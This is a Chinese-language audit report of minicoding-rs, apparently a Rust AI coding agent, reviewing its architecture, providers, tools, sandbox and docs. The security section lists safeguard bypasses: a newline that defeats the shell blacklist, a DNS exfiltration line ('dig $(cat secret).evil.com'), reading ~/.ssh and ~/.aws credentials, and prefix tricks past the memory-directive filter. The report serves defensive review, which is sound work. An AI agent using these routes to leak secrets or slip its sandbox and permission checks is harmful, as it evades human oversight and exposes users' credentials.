# minicoding-rs 全面审查报告（2026-08-25）

> 审查范围：18 个 Cargo crate（约 7.3 万行 Rust）+ `minicoding-web` 前端项目 + 30 份文档（约 2.6 万行）+ CI/CD 与发布体系，git 历史 198+ 提交。
> 审查方法：7 路并行深度评审（文档/核心架构/上下文与记忆/权限沙箱存储/Provider 工具 MCP/四形态前端/工程化），全部发现均经代码级核实（file:line 可追溯）；关键高危项经本地复现验证。
> 本文同时作为后续修复工作的基线清单（见 §12 分阶段修复计划）。

---

## 1. 执行摘要

### 1.1 总体评价

minicoding-rs 是一个**工程纪律罕见地高**的个人项目：依赖治理有 CI 架构守卫测试强制执行、clippy pedantic 全绿零 allow、非测试代码仅 1 处带不变式注释的 `unreachable!`、覆盖率硬门禁 ≥80%、audit/deny/sources 供应链三件套齐备、设计-实现对账标注体系（"2026-08-23 审查遗留#N"）认真运营。安全意识上 fail-closed 倾向明显，多处能力边界诚实披露（TOCTOU、DNS rebinding、词法黑名单局限）。

但本次审查发现了**3 个 High 级安全缺陷、约 20 个 P0/P1 级功能正确性缺陷**，以及两类系统性风险：

1. **词法近似判定的绕过面**：shell 黑名单分段集合缺换行符，`\n` 在 `sh -c` 中即命令分隔符，C-02"黑名单不可绕过"在换行面前不成立；
2. **跨平台防线强度不均**：Landlock 仅拦 TCP（UDP/DNS 外泄通道完整）、Windows 无令牌隔离仅有 Job Object、macOS Seatbelt 最强——同一安全叙事在三平台落地强度差异大；
3. **文档系统性漂移**：sandbox-run 弃用这一事实在 6 处文档中新旧并存；ID 体系 C-/M- 双重占用；功能统计三个口径（182/203/204）。

### 1.2 评分总表

| 维度 | 评分 | 一句话结论 |
|------|:---:|-----------|
| minicoding-core（架构/循环/trait） | **8.5** | 高纪律度核心，扣分在读写调度错序与 PolicyPersist 越界 |
| minicoding-providers | **8.5** | 解析/重试/脱敏高水准，输在 wire-format 细节 bug |
| minicoding-mcp | **8.0** | rmcp 集成与 C-24 教科书级，缺崩溃 supervisor |
| minicoding-server / sdk | **8.0** | 认证/CORS/fail-safe 默认扎实；HTTP 能力落后协议层 |
| minicoding-tools | **7.5** | 广度与安全意识强；worktree 隔离空转是硬伤 |
| cli / tui / protocol / desktop | **7.5** | 各有亮点；四形态能力矩阵漂移明显 |
| minicoding-context | **7.0** | 结构完整；L2 无超时持写锁、配对靠外部兜底 |
| minicoding-web | **7.0** | 架构示范级；Zod guard 漂移拖累为 P0 |
| minicoding-memory | **6.0** | 存储扎实；崩溃级 bug + 多个导出特性零接线 |
| 文档体系 | **6.5** | 深度诚意 9 分，一致性可维护性 4 分 |
| 工程化（CI/CD/测试/版本） | **8.0** | 门禁同构纪律强；MSRV 不可达、发布竞态 |

**综合：7.4 / 10** —— 架构与工程素养达到优秀开源项目水准，距离"生产级可用"的主要差距不在代码质量，而在：若干关键功能空转（worktree 隔离、auto memory 注入）、三平台沙箱强度叙事与实现的差距、以及文档-实现的一致性维护。

---

## 2. 项目定位与差异化优势

### 2.1 站得住的差异化

| 声明 | 评估 |
|------|------|
| **L0 约束实现层强制**（rules.md C-01..C-30，Hook 不可翻案黑名单） | 成立且是最硬的差异点。Claude Code 靠提示词+用户自觉，本项目用 Rust 类型系统与启动自检 `assert_constraints()` 强制。但注意 §5.1-H3：黑名单本身存在换行绕过，强制机制成立的前提是被强制的内容无洞 |
| **事件溯源存储**（EventStore+snapshot+SSE cursor 三级恢复+schema 版本化迁移） | 成立，`--resume`/`--replay`/durable recovery 设计完整 |
| **多前端同核**（CLI/TUI/Web/Desktop 共享 Runtime） | 成立，组装枢纽单一（sdk::builder），权限 Prompter 三端均落实点对点分离 |
| **全链路审计**（决策/压缩/undo 均落 audit.log 0600） | 大体成立；注意 audit 失败是 best-effort 不阻断，且"追加写不可篡改"仅为应用层语义（无哈希链） |
| **安全文档诚实度** | 同类项目少见的高水准：TOCTOU/DNS rebinding/base64|sh 局限主动披露 |

### 2.2 宣传性/存疑表述

1. README 性能数字（冷启动<50ms、首 token<2ms 等）**全部无基准出处**，目标写成事实语气；
2. innovation.md §12 对比矩阵多处不公允（CC 的 OTel 支持标 ✗ 等）；"auto-review 捕获 96% 恶意行为"系转引 Codex 数据当作本项目预期收益；
3. "OS 沙箱一等公民"作为对 Codex 的差异点不成立——innovation.md 自认"参考 Codex"，sandbox-run 弃用后进一步向 Codex 方案收敛；
4. "10 类 Hook 精简优于 CC 27 类"是取舍非优势，且 asyncRewake 后台执行未接线而 features.md 标已实现。

### 2.3 AGPL-3.0-only 与定位的矛盾

- 与"可嵌入 SDK"定位**直接冲突**：Rust 静态链接下商业方嵌入即构成衍生作品，AGPL 网络条款触发开源义务，将显著抑制企业采用与 IDE 插件生态；
- 对标产品 Codex CLI 为 Apache-2.0；
- 讽刺的是项目曾因 EUPL-1.2 许可证弃用 sandbox-run（合规意识强），却选择了对采用最不利的自有许可证，且**该权衡无任何文档记录**。

---

## 3. 模块化架构（18 crate）

### 3.1 做得好的

- 依赖方向单向不循环，每个领域 crate 都有 `architecture.rs` 守卫测试锁定依赖白名单（含禁用前缀、feature 中 `dep:minicoding-*` 检查）；
- 约 20 个 trait 全部手写 `Pin<Box<dyn Future + Send>>` 返回类型，无一遗漏、无 async-trait 残留；
- 13 个 Noop 兜底实现且不是哑的（`NoopHookRegistry::dispatch` 仍尊重 builtin_deny）;
- 并发双轨制执行彻底：短临界区 std 锁不跨 await、跨 await tokio 锁、毒化统一恢复、静态断言 `Runtime: Send + Sync`。

### 3.2 问题

| 编号 | 问题 | 位置 |
|---|---|---|
| A-1 | **core 零实现在渗漏**：`policy/persist.rs` 是具体的磁盘持久化后端（同步 fs + tmp/rename + 0600），按 §3.3 应属 storage 域；守卫测试只管依赖不管逻辑，红线缺自动化手段 | core/src/policy/persist.rs |
| A-2 | `is_builtin_deny` 把一切 `Verdict::Deny` 当 L0 黑名单处理，是对 BuiltinPolicy 行为的隐式耦合假设；未来出现软 Deny 策略将压制全部 Hook | core/src/runtime/permission.rs:214 |
| A-3 | 18 crate 拆分偏重：journal(5 文件)/memory/protocol/extension-sdk 单独成 crate 的收益主要是编译隔离；单人维护税偏高。但有纪律运营，非纸面架构 | workspace |
| A-4 | EventBus 单一容量池（256）：慢消费者积压后丢弃的不只是 Token，也包括 MessageAppended/PermissionResolved 等状态事件；tokio broadcast 无优先级丢弃能力，design.md §11.2"优先级丢弃策略"表述在实现上不成立 | core/src/runtime/event.rs |
| A-5 |杂物入库：`subagent_artifact.txt`（测试残留）与 `bindings/serde_json/JsonValue.ts`（ts-rs 导出泄漏）已提交进 git | crates/minicoding-core/ |

---

## 4. AI Provider 与工具系统

### 4.1 Providers（8.5/10）

做得好：SSE 字节缓冲防 UTF-8 跨 chunk 截断、RetryProvider 仅重试建立阶段（流中途不重试，正确）、双层超时（建立 60s + read_timeout 300s）、Anthropic prompt caching 双断点、图片块降级为占位文本而非静默丢弃、wiremock 测试规范。

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| PR-1 | P1 | OpenAI `"usage": null` 每 chunk 产出全零 Usage delta（应加 `!usage.is_null()`） | providers/openai.rs:419 |
| PR-2 | P1 | OpenAI 使用已废弃 `max_tokens`（o 系/gpt-5 要求 `max_completion_tokens` 直接 400）；o 系拒自定义 temperature 未 gate | providers/openai.rs:146,152 |
| PR-3 | P1 | Anthropic thinking 启用时 `top_p` 未 gate（要求互斥，400） | providers/anthropic.rs:173 |
| PR-4 | P2 | thinking 时 max_tokens 仅 budget+1，思考稍长即截断正文 | providers/anthropic.rs:122 |
| PR-5 | P2 | capabilities 全静态硬编码（128K/4096、200K/8192）与实际 model 不联动 | providers/openai.rs:193 |
| PR-6 | P3 | SSE 缓冲无上限，故障服务端可无限撑大 | providers/sse.rs:112 |

小 LLM 现状："配置存在、路由未接线"——`Router` trait + `StaticRouter` 恒返主 provider，`task_kind="summary"` 分流尚未落地。

### 4.2 Tools（7.5/10）

22 个内置工具，对标 Claude Code 主力工具均有对应；Edit 强制唯一匹配+multiedit 内存原子应用+journal 记录；shell 进程组 setpgid+killpg 树杀+双路输出限流+超时 clamp 回归测试。

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| T-1 | **P0** | **WorktreeSubagentRunner 未把 worktree 路径传入子 Agent**：SubagentSpec 无 workdir 字段，子 Agent 在当前进程 CWD 工作，worktree 隔离整体空转；测试用 CommittingRunner 自欺式验证 | tools/worktree.rs:176; core/model/subagent.rs |
| T-2 | P1 | merge_back 失败仅 warn，结果照常 completed，父 Agent 无法感知改动丢失 | tools/worktree.rs:215 |
| T-3 | P1 | git.apply/web.fetch/git.diff 无超时（不受 ctx.timeout 约束，可无限挂起，违反 C-07） | tools/git/apply.rs:139 等 |
| T-4 | P1 | 嵌套限制仅在 runner 侧移除工具，task.spawn 本身不做深度防御 | tools/task/spawn.rs:14 |
| T-5 | P2 | fs.grep 同步 WalkBuilder 在 async fn 里跑 + 全量 read_to_string，大仓库阻塞 worker | tools/fs/grep.rs:133 |
| T-6 | P2 | web.fetch 响应体无界缓冲后才截断；首跳 DNS rebinding TOCTOU（重定向跳已防） | tools/web/fetch.rs:92,144 |
| T-7 | P2 | git.apply 不记 journal，/undo 无法回滚 patch 应用结果，破坏 C-28 闭环 | tools/git/apply.rs |
| T-8 | P2 | 后台 shell store 无回收（HashMap 无界增长）；redact 行内任意 sk- 整行替换误杀面大 | tools/shell/background.rs:243 |
| T-9 | P3 | 缺 NotebookEdit/图片读取/LSP 类工具；web.search 为 DDG HTML 正则抓取（改版即碎，已自认） | — |

### 4.3 MCP（8.0/10）

rmcp 2.x 集成规范；inflight 去重 Shared future 是亮点；C-24 项目指纹分桶持久化批准完整；wrapper 默认不信任远端自报只读（trust_read_only_hint=false）。

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| MC-1 | P1 | 无崩溃自动重启 supervisor（被动 is_closed 扫描）；restart() 把所有 server 全量重连 | mcp/rmcp.rs:436 |
| MC-2 | P1 | start_one 覆盖旧连接不 cancel，隐式依赖 drop 杀子进程 | mcp/rmcp.rs:353 |
| MC-3 | P2 | 手写 base64 编解码，违反自家"不自研能用库"规范；解码器宽松放行非法输入 | mcp/client/rmcp.rs:709 |
| MC-4 | P2 | `mcp serve` 零权限暴露写工具（expose 直通 execute）；cli serve.rs 的 expose_write_tools 旗标被紧随其后的无条件注册完全失效 | mcp/expose.rs:154; cli/serve.rs:359 |
| MC-5 | P2 | warm_up 刷新工具列表不同步 hints；三作用域同名 server 静默覆盖；stderr inherit 会花屏 TUI | mcp/rmcp.rs:160,606 |

### 4.4 Extension SDK（7.5/10）

Registrar capability 校验（少声明拒绝）+ init 失败 bundle 整体丢弃的事务式注册干净；9 个 PromptContributor 稳定段 cacheable 排序有测试。问题：semver 兼容策略有名无实（version 字段存在但无 host API 版本校验）；IPC 载体空壳；manifest permissions 静态校验未见落地调用。

---

## 5. 上下文管理与记忆机制

### 5.1 四级压缩（context，7.0/10)

管道 L1 裁剪→L2 摘要→L3 滚动→L4 硬截断结构完整，压缩审计追溯（dropped_range/tokens + AuditKind::Compress）扎实，熔断恢复路径（60s 半开冷却）有明显审查迭代痕迹。

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| CT-1 | **P0** | **L2 摘要 LLM 调用无超时，且持 messages 写锁跨越该调用**——provider 挂起 = 所有 append/snapshot 全局停摆（对比 session_sum 有 30s 超时） | context/compress/fallback.rs:84; manager.rs:269 |
| CT-2 | P1 | L2/L3/L4 完全不感知 tool_use/tool_result 配对边界，留 call 删 result 或反之会产生孤儿；严格 provider 直接 400。目前靠 core repair_request_messages 下游兜底，且只修请求副本不改事实源 | rolling.rs:60; summarize.rs:145 |
| CT-3 | P1 | hard_truncate O(迭代数×全量 token) 重分词，大上下文丢几百条秒级卡顿 | hard_truncate.rs:50 |
| CT-4 | P2 | 熔断阈值/cooldown 硬编码，违反 design §3.6 可配承诺；L2 备用 provider 恒 None（降级链第 2 级形同虚设） | manager.rs:114; summarize.rs:93 |
| CT-5 | P2 | post-compact 从压缩后历史提取 read 路径——恰在最需要恢复的场景失效（design §3.10 要求独立环形缓冲）；std::fs 阻塞读 + current_dir 而非会话 workdir | manager.rs:501,509 |
| CT-6 | P2 | L1 裁剪无新近性保护（当前 turn 刚返回的大 tool_result 同样被裁剪）；is_sticky 恒 false（TODO M5 未兑现） | clip.rs:33; weight.rs:46 |
| CT-7 | P3 | Anthropic token 计数为估算（±30%），calibrate 口径差（actual 含 system+tools，本地只计 messages）系统性偏保守 | anthropic.rs:525; manager.rs:412 |

### 5.2 记忆机制（memory，6.0/10）

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| MM-1 | **P0** | vector.rs BM25 索引 `doc.content[..200]` **字节切片**，CJK 内容直接 panic——全仓唯一发现的崩溃级缺陷 | memory/vector.rs:148 |
| MM-2 | **P0** | `inject_auto_memory`/`inject_memory` 生产零调用——auto memory 只写不读，"学习记录"永远进不了模型上下文，§8.7 注入策略整体未接线 | memory/auto.rs |
| MM-3 | P1 | BM25 MemoryIndex 导出即死代码；长期记忆无容量上限（§8.3 的 10% 预算截断未实现） | memory/vector.rs; long_term.rs |
| MM-4 | P1 | contains_directive 行首前缀匹配可被任意前缀绕过（`IMPORTANT:`/引用块内嵌指令），只挡写入不复检存量 | core/util/mod.rs:36 |
| MM-5 | P2 | AutoMemory 双文件两次 rename 无串行锁（对比 long_term 有 save 锁），并发 add_entry 可错配 | auto.rs |
| MM-6 | P2 | loader 缺全局层 $MINICODING_HOME/AGENTS.md、override、@import、可配 fallback 文件名（对照 §8.6 四项缺失）；`.git` 文件形式（worktree/submodule）漏探测 | loader.rs |

正面：物理隔离（auto.md vs long_term.md 分目录）、contains_directive 单一事实源下沉 core 消除双实现漂移、降级 Ask 真实接线于 policy/builtin.rs check_memory_write、tmp+rename 原子写。

---

## 6. 安全权限模型与 OS 沙箱

### 6.1 High 级发现

| 编号 | 发现 | 位置 |
|---|---|---|
| **S-1 (H)** | **AllowAlways 一次按键 = 该工具永久全局放行**：交互链路持久化的是工具级 `set_allow(&call.name)` 写入用户级 policy.toml——对某次 cargo build 按 a 后，所有会话所有项目的 shell.run 全部静默自动批准。路径级 API（set_allow_path）已实现但从未接线 | core/runtime/permission.rs:523 |
| **S-2 (H)** | **shell 黑名单换行绕过**：分段集合 `[';','|','&','\`']` 不含 `\n`，而 sh -c 中换行即命令分隔符。`command: "true\nrm AGENTS.md"` 完全不命中黑名单；预批准缓存复合操作符列表同样缺换行，`cargo build\ngit push` 可借前缀命中直接 Allow | policy/builtin.rs:242,138 |
| **S-3 (H)** | **Landlock 仅拦 TCP**：只 handle BindTcp/ConnectTcp（ABI4 仅支持 TCP），注释宣称"拒绝联网"但 UDP/DNS/raw socket 完全开放——沙箱子进程可 `dig $(cat secret).evil.com` 外泄，配合 HOME 只读放行构成完整 exfil 链 | sandbox/linux.rs:166 |

### 6.2 Medium 级发现

| 编号 | 发现 | 位置 |
|---|---|---|
| S-4 | HOME 整体只读放行 = 子进程可读 ~/.ssh/~/.aws 凭证复制进可写 workdir 外带（两平台共有）；默认模式下 .git 实际可写（landlock 并集语义），VCS 防线只剩词法黑名单且 WRITE_VERBS 不含 cp | sandbox/linux.rs:201,264 |
| S-5 | Windows "受限令牌"名不符实：仅 Job Object 无 Restricted Token/AppContainer；BREAKAWAY_OK 方向反了允许脱离 Job；CPU/内存上限文档声称实际未设置；JobHandle 立即 drop 丧失运行时 kill 能力 | sandbox/windows.rs:156 |
| S-6 | denial detector 纯文本子串匹配，LLM 可 echo "Operation not permitted" ×5 触发熔断打断自己的 turn | sandbox/denial.rs:22 |
| S-7 | journal undo 失败 entry 回推头部破坏 LIFO 撤销顺序 | journal/journal_impl.rs:125 |
| S-8 | event_store append 无锁且两次 write（M-01 在 JsonlStorage 修掉的模式在事件流重现） | storage/event_store.rs:110 |
| S-9 | redact 每行只看第一个分隔符，`PORT=8080 API_KEY=sk-x` 整行漏检 | policy/redact.rs:84 |
| S-10 | Windows 尾随点/空格文件名绕过 C-23/VCS 保护（Win32 创建时剥离尾随字符） | policy/builtin.rs:374 |
| S-11 | policy/ssrf.rs 死代码缺 v4-mapped/NAT64 修补且文档误导接线方，与 tools/web/ssrf.rs 双实现漂移 | policy/ssrf.rs:164 |
| S-12 | policy.toml 路径前缀裸 starts_with，兄弟目录碰撞（allow["fs.write@src/gen"] 命中 src/gen-evil） | core/policy/persist.rs:79 |

### 6.3 Low 级发现

audit.log 已存在时不收紧权限位；fork/index 文件未设 0600；删除会话 unlink 持锁文件的 flock inode 竞态；read-only 预设下 TMPDIR 全局可写；macOS (allow signal)/(allow mach-lookup) 过宽可 DoS 宿主；journal 内存无上限且纯内存意味着崩溃后失去 undo 能力。

### 6.4 隔离强度诚实评估（WorkspaceWrite 默认预设）

- **能防**：workdir 外写入、系统文件破坏、TCP 连接/监听（macOS 含全网络）、exec 非白名单二进制（macOS）；
- **不能防**：读取 HOME 全部凭证（两平台）、UDP/DNS 外泄（Linux）、seccomp 缺位下的内核攻击面（**seccomp 确未接入**，Cargo.toml 无 libseccomp）、信号投递、/proc 窥探、ptrace 同 uid、内核提权（landlock 非 security boundary）、TOCTOU 窗口路径替换。
- NoopDriver 降级静默继续而非拒绝启动（仅 tracing warn），建议 CLI 启动横幅显著提示。

### 6.5 正面确认

Hook 无法越过黑名单 Deny 双重保障成立（dispatch 忽略 + 取严合并）；Plan 门顺序有测试锁定；replay 对副作用硬 Deny（C-06）成立；路径校验 canonicalize_or_parent + 组件级 starts_with + proptest 不变式质量高；凭证 env_clear+白名单单一事实源落实扎实（C-04 此项合格）。

---

## 7. 四形态前端一致性

### 7.1 一致性矩阵（✓/✗）

| 功能 | CLI | TUI | Web | Desktop |
|---|:---:|:---:|:---:|:---:|
| 流式渲染/权限弹窗/resume | ✓ | ✓ | ✓(最健壮) | ✓ |
| replay/fork | ✓ | ✗ | ✗ | ✗ |
| /undo | ✓ | ✗ | ✗(协议就绪 HTTP 缺路由) | ✗ |
| 运行中切权限/Plan | ✓ | ✗ | ✗ | ✗ |
| /model、@引用、斜杠命令 | ✓ | ✗ | ✗ | ✗ |
| 多会话列表/MCP(C-24) | 部分 | ✓/✗ | ✓/✗ | ✓/✗ |
| Markdown 渲染 | ✗ | ✓ | ✓ | ✓ |

组装枢纽单一（CLI re-export sdk builder；TUI 直调；Server 每会话 Arc<Runtime>;Desktop=Web+sidecar），Prompter 三端落实。**最大功能性漂移**：Undo/SetPermissionMode 协议与 NDJSON 已就绪但 HTTP 无路由（server/http.rs:25 明注）。

### 7.2 关键问题

| 编号 | 级别 | 问题 | 位置 |
|---|---|---|---|
| F-1 | **P0** | Web Zod guard 与协议双向漂移：KNOWN_EVENT_KINDS 缺 reasoning_delta/session_created/step_*，却含幽灵 kind hook_run/file_undone/compress（core Event 根本没有）；校验失败事件被静默丢弃 → 真实后端的 reasoning 增量永远进不了 UI | web/api/event-guard.ts:9 |
| F-2 | P1 | SSE seq 分配非幂等：turn 消费 task 与每个 SSE 订阅各自 push_event 分配新 seq——ring buffer 重复、跨客户端 seq 不一致、断线重放重复事件（含权限弹窗错乱回归风险） | server/session_mgr.rs:624; sse.rs:133 |
| F-3 | P1 | cli serve.rs:359 MCP expose_write_tools 旗标失效（条件注册后紧跟无条件注册）且 prompter=None 无审批通道 | cli/serve.rs:359 |
| F-4 | P2 | Desktop auth-token 经 argv 下发（与同文件拒传 --api-key 的 cmdline 泄露理由直接矛盾）；无 tauri-plugin-updater | desktop/sidecar.rs:73 |
| F-5 | P2 | server http.rs:691 `.expect()` 可 panic（违反自家规范）；202 响应残留空字段 | server/http.rs:691,734 |
| F-6 | P2 | vite dev proxy 漏 /config /metrics（dev 设置面板必坏）；as never/as {to} 类型断言绕过生成契约 | web/vite.config.ts:13 |
| F-7 | P3 | sdk ask_stream 丢弃 ReasoningDelta；CLI 单次模式不渲染工具过程 | sdk/stream.rs:98; cli/main.rs:330 |

正面：Server 认证默认启用+常量时间比较+CORS URI host 精确解析防伪装；SSE cursor 三级恢复+首次连接不回放防弹窗错乱；TUI 非半成品（UTF-8 光标/C-23 弹窗退化/scrollback/F2 会话切换）；Desktop 孤儿进程 PID 兜底强杀+CSP 收紧；Web 无 dangerouslySetInnerHTML、MSW 测试资产超预期。

---

## 8. 文档完备性（6.5/10）

深度与诚意 9 分（伪代码+解释、tech-stack §13 决策记录、威胁模型、诚实边界声明、"实现差异注记 D2"对账机制均属上乘）；一致性与可维护性 4 分：

| 编号 | 问题 |
|---|---|
| D-1 | **sandbox-run/seccomp 六处漂移**：modules.md §0.1/§7、security.md §8.2、roadmap M4/M5、architecture.md §3.3、tech-stack.md §11 残留行、innovation.md §12.2 仍写 sandbox-run/libseccomp，与代码事实（自研胶水+landlock，无 seccomp）冲突 |
| D-2 | ID 体系混乱：C-前缀双重占用（约束 C-03 vs 功能 C-03）、M-07/M-08 同名不同物；"功能与约束一一对应"（AGENTS §4.5）无对照表兑现 |
| D-3 | 统计三方漂移：features 表内自洽 204、README 两处 203、innovation 182；优先级映射 167≠204 |
| D-4 | Event 命名漂移（roadmap/architecture 用 design §11 不存在的名字）；security.md 双 §15/§16 且 §7.3/7.4 错序；TaskStatus Deleted vs Cancelled 冲突 |
| D-5 | hooks.md 示例用已被否决的 trait_variant 宏；api.md §24 axum 选型悬案未闭环；AGENTS §3.8 profiles 未实现当已实现；AGENTS §8.4 "ts-rs 或 specta"二选一悬置 |
| D-6 | features.md H-13 asyncRewake 标已实现实际后台执行未接线；README /undo 列为核心特性但默认关闭+纯内存 |
| D-7 | 单一事实源缺失：同一事实散布 3-6 处靠人肉同步，更新是"追加式核对注盖旧表"；无 markdown xref 自动检查 |
| D-8 | 缺失设计：多 provider 故障切换、成本核算与支出上限、evals（压缩质量无量化评估）、prompt caching 命中率指标、多会话资源隔离、task.spawn 扇出上限、Windows 路径特有绕过分析 |

---

## 9. 工程化质量（8.0/10）

### 做得好
CI 9 道门禁与 pre-commit 11 hook 完全同构；pedantic clippy 全绿零 allow（实测 core 通过）；每 crate 架构守卫；覆盖率 llvm-cov ≥80% 硬门禁；audit+deny(yanked=deny)+sources 供应链三件套；锁步版本继承 0.3.2；Conventional Commits 中文规范；CI 注释带完整故障根因考古；deploy/ 完整 OTel→Prometheus→Grafana 栈；1501 个单测 + 20 个集成测试文件 + proptest/criterion/wiremock 规范使用。

### 问题

| 编号 | 级别 | 问题 |
|---|---|---|
| E-1 | P1 | 发布竞态：desktop-release.yml 与 release.yml 同 tag 并行，前者假设 Release 已建（gh release upload 无兜底） |
| E-2 | P1 | MSRV 1.99 声明不可达也不可验证：stable 1.98 编译不过（nightly-2026-08-18 钉住因上游 ICE），无 MSRV 校验 job |
| E-3 | P2 | 测试时间脆弱性：31 处真实 sleep / 0 处 time::pause，最甚 long_term.rs 真睡 1.1s |
| E-4 | P2 | 工具链漂移：action 版本三套并存（v4/v6/v7/v8）；ci.yml pnpm 未精确钉版（desktop-release.yml 自己注释了必须钉的教训）；node 22 vs 24 |
| E-5 | P3 | .gitignore 忽略 gen/schemas 但该目录已被跟踪（意图矛盾）；insta/assert_cmd 死依赖；build-desktop.sh 用 npm ci 而项目是 pnpm；CHANGELOG 升序排列且与 cliff.toml 双源真相；_typos 排除整个 docs |

---

## 10. 生产就绪风险矩阵

| 风险 | 概率 | 影响 | 现状缓解 |
|---|:---:|:---:|---|
| Hook/黑名单绕过致未授权写（S-2） | 中 | 高 | 默认 Ask 兜底；AutoApprove/Bypass 场景直接命中 |
| AllowAlways 全局放大（S-1） | 高 | 高 | 无——一次误按即全局放行 |
| 沙箱数据外泄（S-3/S-4） | 中 | 高 | TCP 已拦；UDP+HOME 读构成完整链 |
| provider 挂起全局停摆（CT-1） | 低 | 高 | 无超时兜底 |
| worktree 子 Agent 改动丢失/落错仓库（T-1/T-2） | 高 | 高 | merge_back warn 仅日志 |
| OpenAI 新模型 400（PR-2/PR-3） | 高 | 中 | o 系/gpt-5 不可用 |
| Web 丢 reasoning 流（F-1） | 必然 | 中 | guard 静默丢弃 |
| SSE 重连重复事件/弹窗错乱（F-2） | 中 | 中 | pending 快照轮询部分缓解 |
| 压缩破坏配对 400（CT-2） | 中 | 中 | core repair 请求副本兜底 |
| CJK panic（MM-1） | 条件触发 | 低 | BM25 未接线故暂无生产暴露 |

---

## 11. 设计层面的问题（对 design.md 本身的批评）

1. **压缩权重模型以单条消息为粒度**（§3.2），未定义 turn 边界原子单元，配对完整性靠 repair.rs 补丁暗示而非设计保证；
2. **§3.10 post-compact 重注入 × §3.6 thrash 计数交互未定义**：预算紧张时有意的重注入会触发熔断，两节互相不知情；
3. **EventBus"优先级丢弃"**（§11.2）在 tokio broadcast 上实现不成立，应直说兜底是 durable 重放；
4. **non_tty "allow" 策略自相矛盾**（§9.2 说 allow 但高风险仍 Deny，§9.6 又说风险评估不改 Verdict——"高风险"判定无归属）；
5. **Ask 期间生命周期竞态未规格化**：300s 超时后前端仍持 prompt_id 点击允许返回什么、第二个前端 resolve 行为未写；
6. **PostToolUse 可改写 result 无二次校验**（假成功回灌 LLM），与 MCP 输出不可信待遇不一致，信任模型未声明；
7. **turn 进行中 /undo 无互斥描述**；worktree merge 回主工作区的改动不经 fs.write 工具不进 journal，/undo 对其失明；
8. **BypassPermissions+DangerFullAccess 双防线同时拆除**仅剩启动确认，防御依赖"用户审计 AGENTS.md"——诚实但薄弱。

---

## 12. 分阶段修复计划（本报告基线 → 修复提交映射）

| 阶段 | 覆盖发现 | 内容 |
|---|---|---|
| R1 安全 | S-1,S-2,S-3,S-7~S-12,L 组 | 换行归一化、AllowAlways 路径级持久化+审计可达、redact 多赋值、persist 边界匹配、journal LIFO、event_store 原子写、audit 收紧、0600、Windows Job 修正、landlock 诚实注释 |
| R2 core | A-2,A-5,PR 相关 core 面,T-1(spec 字段) | 读写调度保序回退、终态消息落盘、span.instrument、Deny 语义澄清、杂物清理、SubagentSpec.workdir |
| R3 context/memory | CT-1~CT-5,MM-1,MM-5 | L2 超时+锁收窄、配对感知组扩展、hard_truncate 增量计数、熔断可配、post_compact 异步化、CJK panic、save 锁 |
| R4 providers/tools/mcp/sdk | PR-1~PR-6,T-2~T-8,MC-1~MC-4 | usage:null、max_completion_tokens、top_p gate、thinking 余量、SSE 上限、worktree 注入+merge 结果、超时补齐、grep spawn_blocking、fetch 体上限、apply 记账、后台回收、mcp 定向重启/关停旧连接/hints/base64/旗标、sdk Reasoning 透传 |
| R5 前端 | F-1~F-6 | seq 单源分配、Undo/SetPermissionMode HTTP 路由、guard 由生成物再生成、desktop env 传 token、expect 清除、vite proxy |
| R6 文档 | D-1~D-6 | 六处 sandbox-run 对齐、编号重建、统计统一、命名权威化、features 降级标注 |
| R7 工程 | E-1,E-4,E-5 | 发布兑底、pnpm 钉版、node 对齐、ignore 矛盾、死依赖、脚本包管理器 |

**明确延期项**（需立项而非修补，记入 roadmap 建议）：seccomp 接入、DNS 解析-连接 IP pinning、HOME 白名单细粒度化、EventBus 双通道拆分、Tauri 自动更新、TUI 斜杠命令体系、evals 框架、多 provider 故障切换、成本核算。
